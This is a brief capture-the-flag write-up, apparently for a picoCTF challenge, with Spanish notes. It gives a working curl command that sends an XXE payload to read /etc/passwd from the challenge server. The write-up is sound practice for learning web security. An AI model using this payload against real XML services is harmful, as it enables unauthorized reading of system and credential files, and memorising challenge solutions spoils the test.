## descripcion 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

### notas 
lo que se hace es que primeramente. se entra al sitio web donde esta la instancia que de otorga el server, con ayuda de un comando que se encuentra en dc, ponemos en la terminal sustituyendo el link del servidor, y posteriorente se va a mostrar la bandera.

```
jayyd@MacBook-Pro-de-Victor ~ % curl -s -k -X POST http://saturn.picoctf.net:63981/data \

-H "Content-Type: application/xml" \

--data-binary '<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ELEMENT foo ANY >

  <!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<data><ID>&xxe;</ID></data>'
```